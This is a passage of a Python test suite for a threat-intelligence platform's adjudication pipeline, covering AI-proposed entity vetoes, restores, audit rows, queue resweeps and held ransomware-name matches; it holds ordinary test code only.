            after={"proposed_name": "CobaltStrike"},
            reasoning="scanner",
            applied=False,
        )
    )
    await db_session.flush()
    _items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [
            {"item_id": f"link:threat_actor:{victim.id}", "verdict": "veto", "confidence": "high", "reason": "victim"},
            {
                "item_id": f"link:tool:{cobalt.id}",
                "verdict": "remove",
                "confidence": "high",
                "reason": "Cobalt Strike only in generic advice",
            },
        ],
    )
    cfg = await adj._settings(db_session)
    await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.commit()

    entry_id, victim_id = entry.id, victim.id
    resp = await client.post(
        "/api/admin/hygiene/review-groups/apply", headers=admin_headers, json={"origin": "adjudicator"}
    )
    assert resp.status_code == 200, resp.text
    assert resp.json()["applied"] == 2 and resp.json()["errors"] == [] and resp.json()["has_more"] is False
    db_session.expire_all()
    assert (
        await db_session.execute(select(EntryTool).where(EntryTool.entry_id == entry_id))
    ).scalar_one_or_none() is None
    assert (
        await db_session.execute(select(ThreatActor).where(ThreatActor.id == victim_id))
    ).scalar_one_or_none() is None
    pending = (
        (await db_session.execute(select(EntityMaintenanceLog).where(EntityMaintenanceLog.applied.is_(False))))
        .scalars()
        .all()
    )
    assert [r.action for r in pending] == ["normalize_name"]

    # Dismiss-all scoped to the adjudicator leaves the scanner's row alone.
    resp = await client.post(
        "/api/admin/hygiene/review-groups/dismiss", headers=admin_headers, json={"origin": "adjudicator"}
    )
    assert resp.status_code == 200
    db_session.expire_all()
    pending = (
        (await db_session.execute(select(EntityMaintenanceLog).where(EntityMaintenanceLog.applied.is_(False))))
        .scalars()
        .all()
    )
    assert [r.action for r in pending] == ["normalize_name"]
    resp = await client.post("/api/admin/hygiene/review-groups/dismiss", headers=admin_headers, json={"origin": "scan"})
    assert resp.json()["cleared_rows"] == 1


@pytest.mark.asyncio
async def test_orphaned_feed_lists_scan_rows_no_entry_can_carry(
    client, admin_headers, db_session: AsyncSession, feed, admin_user
):
    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    minted = await _link_actor(db_session, entry, "Water Utility Co", source="ai", minted=True, article_count=1)
    lone = ThreatActor(name="tortilla", article_count=1)  # no creating entry
    db_session.add(lone)
    await db_session.flush()
    for who in (minted, lone):
        db_session.add(
            EntityMaintenanceLog(
                entity_type="threat_actor",
                entity_id=who.id,
                action="stale_entity_review",
                mode="shadow",
                before={"entity": {"name": who.name}},
                after={},
                reasoning="1 article",
                applied=False,
            )
        )
    await db_session.commit()
    resp = await client.get("/api/admin/hygiene/feed", headers=admin_headers, params={"orphaned": "true"})
    assert resp.status_code == 200, resp.text
    listed = {r["entity_id"] for r in resp.json()["rows"]}
    assert str(lone.id) in listed  # nothing records which entry created it
    assert str(minted.id) not in listed  # the backfill will reach its entry

    # The registry tool calls the route function directly, so it must not
    # inherit the route's orphaned filter: unfiltered, it lists both rows.
    from app.tools.curation import _get_hygiene_feed

    out = await _get_hygiene_feed(db_session, admin_user.id)
    assert {str(r["entity_id"]) for r in out["rows"]} >= {str(lone.id), str(minted.id)}


@pytest.mark.asyncio
async def test_hygiene_feed_tool_accepts_origin(db_session: AsyncSession, admin_user):
    from app.tools.curation import _get_hygiene_feed, _get_hygiene_stats

    out = await _get_hygiene_feed(db_session, admin_user.id, origin="adjudicator", pending=True)
    assert "rows" in out and "error" not in out
    assert "error" in await _get_hygiene_feed(db_session, admin_user.id, origin="nightly")
    stats = await _get_hygiene_stats(db_session, admin_user.id)
    assert "adjudication_breaker_until" in stats


@pytest.mark.asyncio
async def test_processing_rows_show_queued_and_skip_reason_for_adjudicate(
    client, admin_headers, db_session: AsyncSession, feed
):
    from app.models.entry_pipeline_run import EntryPipelineRun

    await _seed_settings(db_session)
    waiting = await _make_entry(db_session, feed)
    row = await _request(db_session, waiting)
    row.adjudication_status = adj.SKIPPED_BUDGET
    queued = await _make_entry(db_session, feed)
    row2 = await _request(db_session, queued)
    row2.adjudication_status = adj.PENDING
    row2.adjudication_queued_at = datetime.now(UTC)
    reviewed = await _make_entry(db_session, feed)
    row3 = await _request(db_session, reviewed)
    row3.adjudication_status = adj.COMPLETED
    db_session.add(
        EntryPipelineRun(
            entry_id=reviewed.id, stage="adjudicate", status="success", duration_ms=38000, detail={"mode": "shadow"}
        )
    )
    await db_session.commit()

    resp = await client.get("/api/engine/processing", headers=admin_headers, params={"limit": 50})
    assert resp.status_code == 200, resp.text
    cells = {r["id"]: r["stages"].get("adjudicate") for r in resp.json()["entries"]}
    assert cells[str(waiting.id)]["status"] == "skipped" and cells[str(waiting.id)]["detail"]["skipped"] == "budget"
    assert cells[str(queued.id)]["status"] == "queued"
    assert cells[str(reviewed.id)]["status"] == "success" and cells[str(reviewed.id)]["duration_ms"] == 38000

    resp = await client.get(f"/api/engine/entries/{reviewed.id}/adjudication", headers=admin_headers)
    assert resp.json()["run"]["duration_ms"] == 38000 and resp.json()["run"]["mode"] == "shadow"


@pytest.mark.asyncio
async def test_processing_rows_show_the_ai_analysis_column(client, admin_headers, db_session: AsyncSession, feed):
    """The analysis writes no pipeline runs; its column comes from the queue
    row, and a review waiting on it says so instead of rendering blank."""
    await _seed_settings(db_session)
    rows = {}
    for st in ("submitted", "completed", "skipped_junk", "skipped_feed_ai", "failed"):
        entry = await _make_entry(db_session, feed)
        await _request(db_session, entry, status=st)
        rows[st] = str(entry.id)
    await db_session.commit()

    resp = await client.get("/api/engine/processing", headers=admin_headers, params={"limit": 50})
    assert resp.status_code == 200, resp.text
    body = resp.json()
    assert "analyze" in [s["name"] for s in body["stages"]]
    by_id = {r["id"]: r["stages"] for r in body["entries"]}
    assert by_id[rows["submitted"]]["analyze"]["status"] == "queued"
    assert by_id[rows["submitted"]]["adjudicate"]["detail"] == {"waiting_on": "analysis"}
    assert by_id[rows["completed"]]["analyze"]["status"] == "success"
    assert by_id[rows["skipped_junk"]]["analyze"]["detail"]["skipped"] == "junk"
    assert by_id[rows["skipped_feed_ai"]]["analyze"]["detail"]["skipped"] == "feed_ai"
    assert by_id[rows["skipped_feed_ai"]]["adjudicate"]["detail"]["skipped"] == "no_analysis"
    assert by_id[rows["failed"]]["analyze"]["status"] == "error"
    assert body["stats"]["by_stage_errors"].get("analyze") == 1

    resp = await client.get(
        "/api/engine/processing", headers=admin_headers, params={"stage": "analyze", "status": "skipped"}
    )
    assert {r["id"] for r in resp.json()["entries"]} == {rows["skipped_junk"], rows["skipped_feed_ai"]}

    # The stage overview carries a synthetic analyze row (queue rows as runs),
    # so the column header, popover and panel work like a registry stage's.
    resp = await client.get("/api/engine/pipeline", headers=admin_headers)
    names = [s["name"] for s in resp.json()["stages"]]
    assert names.index("analyze") == names.index("adjudicate") - 1
    analyze = next(s for s in resp.json()["stages"] if s["name"] == "analyze")
    assert analyze["runs_24h"] == {"success": 1, "error": 1, "retry": 0, "new_error": 1, "new_retry": 0, "queued": 1}


@pytest.mark.asyncio
async def test_matrix_retry_requeues_the_request_row(
    client, admin_headers, db_session: AsyncSession, feed, monkeypatch
):
    from app.workers.celery_app import celery_app

    sent: list = []

    class _Result:
        id = "task-1"

    monkeypatch.setattr(celery_app, "send_task", lambda name, kwargs=None: sent.append((name, kwargs)) or _Result())
    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    row = await _request(db_session, entry)
    row.adjudication_status = adj.SKIPPED_SCORE
    await db_session.commit()
    resp = await client.post(f"/api/engine/entries/{entry.id}/stages/adjudicate/retry", headers=admin_headers)
    assert resp.status_code == 200, resp.text
    assert sent and sent[0][0].endswith("adjudicate_entry_task")
    db_session.expire_all()
    await db_session.refresh(row)
    assert row.adjudication_status == adj.PENDING and row.adjudication_queued_at is not None


# ------------------------------------------------------------------ review round (part 10)


@pytest.mark.asyncio
async def test_a_restore_is_history_not_a_fresh_verdict(client, admin_headers, db_session: AsyncSession, feed):
    """A restore used to re-file its own action with applied=False, so the
    needs-you chip counted it and "Apply all" re-ran the change just undone."""
    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    victim = await _link_actor(
        db_session, entry, "Water Utility Co", source="ai", minted=True, article_count=1, aliases=["WUC"]
    )
    _items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [{"item_id": f"link:threat_actor:{victim.id}", "verdict": "veto", "confidence": "high", "reason": "victim"}],
    )
    cfg = await adj._settings(db_session)
    await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.commit()
    row = (
        await db_session.execute(select(EntityMaintenanceLog).where(EntityMaintenanceLog.action == ACTION_VETO))
    ).scalar_one()

    assert (
        await client.post(f"/api/admin/hygiene/adjudication/{row.id}/apply", headers=admin_headers)
    ).status_code == 200
    assert (
        await client.post(f"/api/admin/hygiene/adjudication/{row.id}/restore", headers=admin_headers)
    ).status_code == 200

    # The audit line carries its own action, is already applied, and offers nothing.
    audit = (
        await db_session.execute(select(EntityMaintenanceLog).where(EntityMaintenanceLog.action == adj.ACTION_RESTORED))
    ).scalar_one()
    assert audit.applied is True and audit.before["undid"] == ACTION_VETO

    # The row stays applied=True, so `after.restored` is the only thing that
    # stops a second POST re-running the undo and filing a second audit line.
    again = await client.post(f"/api/admin/hygiene/adjudication/{row.id}/restore", headers=admin_headers)
    assert again.status_code == 200 and again.json()["restored"] is False
    assert again.json()["reason"] == "already restored"
    assert (
        await db_session.execute(
            select(func.count())
            .select_from(EntityMaintenanceLog)
            .where(EntityMaintenanceLog.action == adj.ACTION_RESTORED)
        )
    ).scalar_one() == 1

    stats = (await client.get("/api/admin/hygiene/stats", headers=admin_headers)).json()
    assert stats["adjudication_pending"] == 0
    pending = (
        await client.get(
            "/api/admin/hygiene/feed", params={"origin": "adjudicator", "pending": True}, headers=admin_headers
        )
    ).json()["rows"]
    assert pending == []

    # It still reads as adjudicator-origin history, with no buttons.
    rows = (
        await client.get(
            "/api/admin/hygiene/feed", params={"origin": "adjudicator", "mode": "apply"}, headers=admin_headers
        )
    ).json()["rows"]
    audit_row = next(r for r in rows if r["action"] == adj.ACTION_RESTORED)
    assert audit_row["actions"] == [] and audit_row["origin"] == "adjudicator"

    # And Apply all leaves the restored entity alone.
    resp = await client.post("/api/admin/hygiene/review-groups/apply", json={}, headers=admin_headers)
    assert resp.status_code == 200 and resp.json()["applied"] == 0
    db_session.expire_all()
    assert (
        await db_session.execute(select(ThreatActor).where(ThreatActor.id == victim.id))
    ).scalar_one_or_none() is not None


@pytest.mark.asyncio
async def test_restore_endpoints_reject_an_audit_row(client, admin_headers, db_session: AsyncSession, feed):
    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    db_session.add(
        EntityMaintenanceLog(
            entity_type="threat_actor",
            entity_id=uuid.uuid4(),
            action=adj.ACTION_RESTORED,
            mode="apply",
            before={"entry_id": str(entry.id)},
            after={"restored": True},
            applied=True,
        )
    )
    await db_session.commit()
    row = (
        await db_session.execute(select(EntityMaintenanceLog).where(EntityMaintenanceLog.action == adj.ACTION_RESTORED))
    ).scalar_one()
    for verb in ("apply", "restore"):
        resp = await client.post(f"/api/admin/hygiene/adjudication/{row.id}/{verb}", headers=admin_headers)
        assert resp.status_code == 404, f"{verb}: {resp.text}"


@pytest.mark.asyncio
async def test_drawer_shows_a_restored_verdict_once_with_no_actions_left(
    client, admin_headers, db_session: AsyncSession, feed
):
    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    victim = await _link_actor(db_session, entry, "Water Utility Co", source="ai", minted=True, article_count=1)
    _items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [{"item_id": f"link:threat_actor:{victim.id}", "verdict": "veto", "confidence": "high", "reason": "victim"}],
    )
    cfg = await adj._settings(db_session)
    await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.commit()
    row = (
        await db_session.execute(select(EntityMaintenanceLog).where(EntityMaintenanceLog.action == ACTION_VETO))
    ).scalar_one()
    await client.post(f"/api/admin/hygiene/adjudication/{row.id}/apply", headers=admin_headers)
    await client.post(f"/api/admin/hygiene/adjudication/{row.id}/restore", headers=admin_headers)

    body = (await client.get(f"/api/engine/entries/{entry.id}/adjudication", headers=admin_headers)).json()
    vetoes = [v for v in body["verdicts"] if v["verdict"] == "veto"]
    assert len(vetoes) == 1, body["verdicts"]
    assert vetoes[0]["applied"] is True and vetoes[0]["restored"] is True


@pytest.mark.asyncio
async def test_edge_promotion_is_not_counted_as_an_applied_change(db_session: AsyncSession, feed):
    """`applied` means "a change ran"; a keep that bumps the promote counter
    is its own tally, or `shadowed` under-reports the queued proposals."""
    await _seed_settings(db_session, adjudication_mode="apply", adjudication_apply_min_confidence="high")
    entry = await _make_entry(db_session, feed)
    actor = await _link_actor(db_session, entry, "Warlock", article_count=9)
    malware = MalwareFamily(name="Warlock Locker", article_count=4)
    db_session.add(malware)
    await db_session.flush()
    edge = EntityRelationship(
        source_type="threat_actor",
        source_id=actor.id,
        target_type="malware",
        target_id=malware.id,
        relationship_type="uses",
        confidence="probable",
        source="auto_extracted",
        evidence_entry_ids=[entry.id],
        reviewer_kept_entry_ids=[uuid.uuid4(), uuid.uuid4()],
    )
    db_session.add(edge)
    await db_session.flush()

    _items, verdicts = await _verdicts_for(
        db_session,
        entry,
        [
            {"item_id": f"edge:{edge.id}", "verdict": "keep", "confidence": "high", "reason": "asserted"},
            # Below the floor, so it files as a proposal rather than running.
            {
                "item_id": f"link:threat_actor:{actor.id}",
                "verdict": "remove",
                "confidence": "low",
                "reason": "Warlock, unsure",
            },
        ],
    )
    cfg = await adj._settings(db_session)
    detail = await apply_verdicts(db_session, entry, verdicts, _payload(), cfg)
    await db_session.flush()
    await db_session.refresh(edge)
    assert edge.confidence == "confirmed"
    assert detail["promoted"] == 1
    assert detail["applied"] == 0
    assert detail["shadowed"] == 1  # the low-confidence remove is still waiting


@pytest.mark.asyncio
async def test_the_link_cap_keeps_the_rows_only_this_review_can_judge(db_session: AsyncSession, feed, monkeypatch):
    monkeypatch.setattr(adj, "_MAX_LINKS", 3)
    entry = await _make_entry(db_session, feed)
    bulk = [await _link_actor(db_session, entry, f"Bulk Actor {i}", article_count=50) for i in range(6)]
    minted = await _link_actor(db_session, entry, "Brand New Crew", source="ai", minted=True, article_count=1)
    asserted = await _link_actor(db_session, entry, "Named By The AI", source="ai", article_count=7)

    dropped: list = []
    items, block = await build_manifest(db_session, entry, _payload(), dropped_out=dropped)
    ids = {it.item_id for it in items}
    assert len(items) == 3
    assert f"link:threat_actor:{minted.id}" in ids
    assert f"link:threat_actor:{asserted.id}" in ids
    assert len(dropped) == 5 and all(it.source == "auto_link" for it in dropped)
    # One slot is left over after the two that matter, and it goes to the bulk.
    assert len([b for b in bulk if f"link:threat_actor:{b.id}" in ids]) == 1
    # The model is told the list is partial, and the note is never an item.
    assert "not in this list" in block and "_note" not in ids


@pytest.mark.asyncio
async def test_the_edge_cap_keeps_the_claims_born_here(db_session: AsyncSession, feed, monkeypatch):
    """Over the cap, edges this entry alone evidences win the slots — nothing
    else will ever review them — and the overflow is counted, not lost."""
    monkeypatch.setattr(adj, "_MAX_EDGES", 2)
    entry = await _make_entry(db_session, feed)
    seasoned = [await _edge_for(db_session, entry, f"Old Crew {i}") for i in range(3)]
    for e in seasoned:
        e.evidence_entry_ids = [uuid.uuid4(), entry.id]
    born_here = [await _edge_for(db_session, entry, f"New Crew {i}") for i in range(2)]
    await db_session.flush()

    dropped: list = []
    items, block = await build_manifest(db_session, entry, _payload(), dropped_out=dropped)
    edge_ids = {it.edge_id for it in items if it.kind == "edge"}
    assert edge_ids == {e.id for e in born_here}
    assert {it.edge_id for it in dropped if it.kind == "edge"} == {e.id for e in seasoned}
    assert "3 further relationship claims" in block and "autolinked" not in block


@pytest.mark.asyncio
async def test_scope_entities_only_reviews_what_this_article_minted(db_session: AsyncSession, feed):
    entry = await _make_entry(db_session, feed)
    established = await _link_actor(db_session, entry, "Warlock", article_count=30)
    minted = await _link_actor(db_session, entry, "Brand New Crew", source="ai", minted=True, article_count=1)
    ttp = TTP(technique_id="T1486", technique_name="Data Encrypted for Impact")
    db_session.add(ttp)
    await db_session.flush()
    db_session.add(
        EntryTTP(entry_id=entry.id, ttp_id=ttp.id, confidence="high", source_text="they encrypted the shares")
    )
    await db_session.flush()

    # No entity mints a TTP, so a TTP row is an established link, not a new one.
    items, block = await build_manifest(db_session, entry, _payload(), scope={"entities"})
    assert {it.item_id for it in items} == {f"link:threat_actor:{minted.id}"}
    assert "T1486" not in block

    # `links` alone keeps every link but answers no catalogue question, so
    # nothing is veto- or merge-eligible.
    items, _ = await build_manifest(db_session, entry, _payload(), scope={"links"})
    assert {it.item_id for it in items} == {
        f"link:threat_actor:{established.id}",
        f"link:threat_actor:{minted.id}",
        f"link:ttp:{ttp.id}",
    }
    assert all(not it.minted_here and not it.candidates for it in items)
    # The rendered line must agree with the matrix: no row claims to be new.
    _items, block = await build_manifest(db_session, entry, _payload(), scope={"links"})
    assert "NEW, created by this article" not in block
    out, _ = _validate_verdicts(
        {"verdicts": [{"item_id": f"link:threat_actor:{minted.id}", "verdict": "veto", "confidence": "high"}]}, items
    )
    assert all(v.verdict == "keep" for v in out)


def test_a_title_cased_suggested_type_still_reclassifies():
    item = ReviewItem(
        item_id="link:threat_actor:x",
        kind="link",
        line="",
        entity_type="threat_actor",
        entity_id=uuid.uuid4(),
        name="Scattered Spider",
    )
    out, _ = _validate_verdicts(
        {
            "verdicts": [
                {
                    "item_id": item.item_id,
                    "verdict": "reclassify",
                    "confidence": "high",
                    "suggested_type": "Malware",
                    "reason": "Scattered Spider is a family",
                }
            ]
        },
        [item],
    )
    assert out[0].verdict == "reclassify" and out[0].suggested_type == "malware"


# ------------------------------------------------------------------ queue-aware resweep + duplicate dispatch


async def _zero_depth() -> int:
    return 0


@pytest.mark.asyncio
async def test_resweep_defers_while_the_ai_queue_is_deep(db_session: AsyncSession, feed, monkeypatch):
    """A deep queue means reviews are waiting, not lost: the sweep must not
    pile re-enqueues (or a history walk) on top of the analyses behind it."""
    await _seed_settings(db_session)

    async def _deep() -> int:
        return adj.RESWEEP_QUEUE_CEILING + 1

    dispatched: list = []
    monkeypatch.setattr(adj, "_ai_queue_depth", _deep)
    monkeypatch.setattr(adj, "dispatch_adjudication", lambda entry_id, countdown=5: dispatched.append(entry_id))
    entry = await _make_entry(db_session, feed)
    row = await _request(db_session, entry)
    row.adjudication_status = adj.SKIPPED_BUDGET
    await db_session.flush()

    result = await adj.resweep_adjudications(db_session)
    assert result == {"swept": 0, "deferred": adj.RESWEEP_QUEUE_CEILING + 1}
    assert dispatched == []
    await db_session.refresh(row)
    assert row.adjudication_status == adj.SKIPPED_BUDGET


@pytest.mark.asyncio
async def test_task_skips_a_row_already_reviewed(db_session: AsyncSession, feed, monkeypatch):
    """A duplicate dispatch finds the row completed and never calls the model."""
    from contextlib import asynccontextmanager

    from app.workers import adjudication_tasks as tasks

    await _seed_settings(db_session)
    entry = await _make_entry(db_session, feed)
    row = await _request(db_session, entry)
    row.adjudication_status = adj.COMPLETED
    row.adjudicated_at = datetime.now(UTC)
    await db_session.flush()

    @asynccontextmanager
    async def fake_session():
        yield db_session

    class _Lock:
        def set(self, *a, **k):
            return True

        def delete(self, *a, **k):
            return 1

    async def boom(*a, **k):
        raise AssertionError("model must not be called for a row that is already reviewed")

    async def noop_commit():
        await db_session.flush()

    monkeypatch.setattr(tasks, "worker_session", fake_session)
    monkeypatch.setattr(tasks.redis, "from_url", lambda *a, **k: _Lock())
    monkeypatch.setattr("app.ai.engine.run_task", boom)
    monkeypatch.setattr(db_session, "commit", noop_commit)

    detail = await tasks._adjudicate_entry(entry.id)
    assert detail["skipped"] == "already_reviewed" and detail["items"] == 0
    await db_session.refresh(row)
    assert row.adjudication_status == adj.COMPLETED


@pytest.mark.asyncio
async def test_bulk_apply_start_and_progress(client, admin_headers, monkeypatch):
    """Starting a bulk apply records the job, queues the worker, and the
    progress endpoint reads the record back. An unknown domain is a 400 and a
    missing job a 404."""
    from app.workers import proposal_apply_tasks

    queued: list[dict] = []
    monkeypatch.setattr(
        proposal_apply_tasks.bulk_apply_proposals, "apply_async", lambda *a, **kw: queued.append(kw["kwargs"])
    )

    resp = await client.post(
        "/api/admin/hygiene/bulk-apply", headers=admin_headers, json={"action": "shadow_remove", "q": "storm"}
    )
    assert resp.status_code == 202, resp.text
    job = resp.json()
    assert job["status"] == "queued"
    assert job["total"] == 0
    assert queued and queued[0]["job_id"] == job["job_id"]
    assert queued[0]["scope"]["action"] == "shadow_remove" and queued[0]["scope"]["q"] == "storm"

    resp = await client.get(f"/api/admin/hygiene/bulk-apply/{job['job_id']}", headers=admin_headers)
    assert resp.status_code == 200
    assert resp.json()["scope"] == {"action": "shadow_remove", "q": "storm"}

    resp = await client.post("/api/admin/hygiene/bulk-apply", headers=admin_headers, json={"domain": "nope"})
    assert resp.status_code == 400

    resp = await client.get("/api/admin/hygiene/bulk-apply/doesnotexist", headers=admin_headers)
    assert resp.status_code == 404


@pytest.mark.asyncio
async def test_review_domain_facet_spans_both_logs(client, admin_headers, db_session, test_entry, monkeypatch):
    """The Review tab's Domain facet sorts proposals by what applying them
    changes, not by which log holds them: a link-log reclassify advisory is
    an entities proposal, an adjudicator edge demote is a relationships one,
    and the stats carry the same split."""
    from app.models.entity_link_validation_log import EntityLinkValidationLog
    from app.models.entity_maintenance import EntityMaintenanceLog
    from app.models.threat_actor import ThreatActor
    from app.services.entry_adjudication import ACTION_EDGE_DEMOTE, ACTION_IOC_DROP, ACTION_VETO
    from app.workers import proposal_apply_tasks

    actor = ThreatActor(name="Facet Actor", aliases=[])
    db_session.add(actor)
    await db_session.flush()
    db_session.add(
        EntityLinkValidationLog(
            entry_id=test_entry.id,
            entity_type="threat_actor",
            entity_id=actor.id,
            entity_name_snapshot="Facet Actor",
            action="shadow_remove",
            reason="link",
        )
    )
    db_session.add(
        EntityLinkValidationLog(
            entry_id=test_entry.id,
            entity_type="threat_actor",
            entity_id=actor.id,
            entity_name_snapshot="Facet Actor",
            action="needs_reclassification",
            suggested_entity_type="malware",
            reason="advisory",
        )
    )
    for action, after in (
        (ACTION_VETO, {"reason": "junk", "confidence": "high"}),
        (ACTION_EDGE_DEMOTE, {"reason": "co-mention", "confidence": "high"}),
        (ACTION_IOC_DROP, {"reason": "platform ip", "confidence": "high"}),
    ):
        db_session.add(
            EntityMaintenanceLog(
                entity_type="threat_actor",
                entity_id=actor.id,
                action=action,
                mode="shadow",
                before={"entry_id": str(test_entry.id), "entity": {"name": "Facet Actor", "aliases": []}},
                after=after,
                reasoning=after["reason"],
                applied=False,
            )
        )
    await db_session.commit()

    async def feed(domain: str | None):
        params = {"pending": "true"}
        if domain:
            params["domain"] = domain
        resp = await client.get("/api/admin/hygiene/feed", params=params, headers=admin_headers)
        assert resp.status_code == 200, resp.text
        return resp.json()["rows"]

    everything = await feed(None)
    assert {r["domain"] for r in everything} == {"links", "entities", "relationships"}
    assert sorted(r["action"] for r in await feed("links")) == ["shadow_remove"]
    # An observable is an entity type, so dropping one is an entities proposal.
    assert sorted(r["action"] for r in await feed("entities")) == sorted(
        [ACTION_IOC_DROP, ACTION_VETO, "needs_reclassification"]
    )
    assert [r["action"] for r in await feed("relationships")] == [ACTION_EDGE_DEMOTE]
    assert (
        await client.get("/api/admin/hygiene/feed", params={"domain": "nope"}, headers=admin_headers)
    ).status_code == 400

    stats = (await client.get("/api/admin/hygiene/stats", headers=admin_headers)).json()
    assert stats["pending_by_domain"] == {"links": 1, "entities": 3, "relationships": 1}
    assert stats["pending_total"] == 5

    # Apply all covers what the domain shows, type changes included.
    queued: list[dict] = []
    monkeypatch.setattr(
        proposal_apply_tasks.bulk_apply_proposals, "apply_async", lambda *a, **kw: queued.append(kw["kwargs"])
    )
    resp = await client.post("/api/admin/hygiene/bulk-apply", headers=admin_headers, json={"domain": "entities"})
    assert resp.status_code == 202, resp.text
    assert resp.json()["total"] == 3  # the veto, the observable drop, the advisory
    assert queued[-1]["scope"]["domain"] == "entities"
    resp = await client.post("/api/admin/hygiene/bulk-apply", headers=admin_headers, json={"domain": "relationships"})
    assert resp.json()["total"] == 1

    # Dismiss honours the facet too.
    resp = await client.post(
        "/api/admin/hygiene/review-groups/dismiss", headers=admin_headers, json={"domain": "relationships"}
    )
    assert resp.json()["cleared_rows"] == 1
    assert await feed("relationships") == []
    assert len(await feed(None)) == 4


@pytest.mark.asyncio
async def test_a_second_review_does_not_file_the_same_edge_demote_again(db_session: AsyncSession, feed):
    entry = await _make_entry(db_session, feed)
    edge_id = uuid.uuid4()
    assert not await adj._proposal_pending(db_session, ACTION_EDGE_DEMOTE, "relationship", edge_id, entry.id)
    db_session.add(
        EntityMaintenanceLog(
            entity_type="relationship",
            entity_id=edge_id,
            action=ACTION_EDGE_DEMOTE,
            mode="shadow",
            before={"entry_id": str(entry.id), "claim": "ShinyHunters targets Jordan (country)"},
            after={"reason": "arrest location", "confidence": "high"},
            applied=False,
        )
    )
    await db_session.flush()
    assert await adj._proposal_pending(db_session, ACTION_EDGE_DEMOTE, "relationship", edge_id, entry.id)
    # Another article's review of the same edge is its own proposal.
    other = await _make_entry(db_session, feed)
    assert not await adj._proposal_pending(db_session, ACTION_EDGE_DEMOTE, "relationship", edge_id, other.id)


@pytest.mark.parametrize(
    "text",
    ["https://evil.example/a", "hxxps[://]evil[.]example/a", "hxxps[:]//evil[.]example/a", "hxxps://evil[.]example/a"],
)
def test_value_pattern_finds_bracketed_url_separators(text):
    assert adj._value_pattern("https://evil.example/a").search(text)


# ------------------------------------------------------------------ held matches


async def _held_royal(db_session, feed, *, resolution="rejected", reviewed=False, royal=None):
    """An article about the Royal ransomware gang whose held "Royal" match the
    analysis rejected (or has not settled yet, with resolution=None). Pass
    ``royal`` to hold the same entity on another article."""
    entry = await _make_entry(db_session, feed)
    entry.content_text = "The Royal ransomware gang hit a regional hospital.\n\nRecovery took two weeks."
    if royal is None:
        royal = MalwareFamily(name="Royal", article_count=4)
        db_session.add(royal)
        await db_session.flush()
    held = PendingAutolinkMatch(
        entry_id=entry.id,
        entity_type="malware",
        entity_id=royal.id,
        canonical_name="Royal",
        matched_names=["Royal"],
        paragraph_indices=[1],
        confidence="medium",
        resolution=resolution,
        resolved_at=datetime.now(UTC) if resolution else None,
        reviewed_at=datetime.now(UTC) if reviewed else None,
    )
    db_session.add(held)
    await db_session.flush()
    return entry, royal, held


def _link_royal(royal, confidence="high"):
    return [
        {
            "item_id": f"held:malware:{royal.id}",
            "verdict": "link",
            "confidence": confidence,
            "reason": "Royal is named as the ransomware gang behind the attack",
        }
    ]


async def _royal_links(db_session, entry):
    return (await db_session.execute(select(EntryMalware).where(EntryMalware.entry_id == entry.id))).scalars().all()


def _held_link_rows():
    return select(EntityMaintenanceLog).where(EntityMaintenanceLog.action == adj.ACTION_HELD_LINK)


@pytest.mark.asyncio
async def test_manifest_lists_a_rejected_held_match_until_it_is_reviewed(db_session: AsyncSession, feed):
    entry, royal, _held = await _held_royal(db_session, feed)
    items, block = await build_manifest(db_session, entry, _payload())
    [item] = [it for it in items if it.kind == "held"]
    assert item.item_id == f"held:malware:{royal.id}"
    assert "NOT LINKED" in block and 'context: "The Royal ransomware gang' in block

    await adj.mark_reviewed(db_session, entry, items)
    items, _ = await build_manifest(db_session, entry, _payload())
    assert not any(it.kind == "held" for it in items)


@pytest.mark.asyncio
async def test_manifest_skips_unsettled_and_promoted_held_matches(db_session: AsyncSession, feed):
    royal = None
    for resolution in (None, "promoted"):
        entry, royal, _held = await _held_royal(db_session, feed, resolution=resolution, royal=royal)
        items, _ = await build_manifest(db_session, entry, _payload())
        assert not any(it.kind == "held" for it in items), resolution


@pytest.mark.asyncio
async def test_a_reject_linked_another_way_is_not_reviewed_and_never_unlinked(db_session: AsyncSession, feed):
    await _seed_settings(db_session)
    entry, royal, held = await _held_royal(db_session, feed)
    # An analyst (or a new entity's backlink) linked it directly.
    db_session.add(EntryMalware(entry_id=entry.id, malware_family_id=royal.id, source="manual", confidence="high"))
    await db_session.flush()

    items, _ = await build_manifest(db_session, entry, _payload())
    assert not any(it.kind == "held" for it in items)
    assert held.reviewed_at is not None

    # A proposal filed before the analyst linked it is moot, and leaves the link alone.
    db_session.add(
        EntityMaintenanceLog(
            entity_type="malware",
            entity_id=royal.id,
            action=adj.ACTION_HELD_LINK,
            mode="shadow",
            before={"entry_id": str(entry.id), "entity": {"name": "Royal"}, "held": {"id": str(held.id)}},
            after={"reason": "Royal is the gang", "confidence": "high"},
            applied=False,
        )
    )
    await db_session.flush()
    row = (await db_session.execute(_held_link_rows())).scalar_one()
    outcome = await adj.apply_adjudication_row(db_session, row)
    assert outcome == {"applied": False, "reason": "already linked"}
    from app.services.proposal_apply import outcome_is_moot

    assert outcome_is_moot(row, outcome)
    assert [j.source for j in await _royal_links(db_session, entry)] == ["manual"]


def test_validate_link_only_on_held_items_and_only_when_the_reason_names_it():
    held = ReviewItem(item_id="held:malware:x", kind="held", line="", entity_type="malware", name="Royal")
    link = _item("link:threat_actor:y")
    link.name = "Storm"
    verdicts, _ = _validate_verdicts(
        {
            "verdicts": [
                {"item_id": "held:malware:x", "verdict": "link", "confidence": "high", "reason": "the Royal gang"},
                {"item_id": "link:threat_actor:y", "verdict": "link", "confidence": "high", "reason": "Storm"},
            ]
        },
        [held, link],
    )
    assert [v.verdict for v in verdicts] == ["link", "keep"]

    verdicts, stats = _validate_verdicts(
        {"verdicts": [{"item_id": "held:malware:x", "verdict": "link", "confidence": "high", "reason": "a gang"}]},
        [held],
    )
    assert verdicts[0].verdict == "keep" and stats["unnamed_reason"] == 1


@pytest.mark.asyncio
async def test_shadow_held_link_is_a_proposal_that_applies_and_restores(db_session: AsyncSession, feed, admin_user):
    from app.models.false_positive_record import FalsePositiveRecord

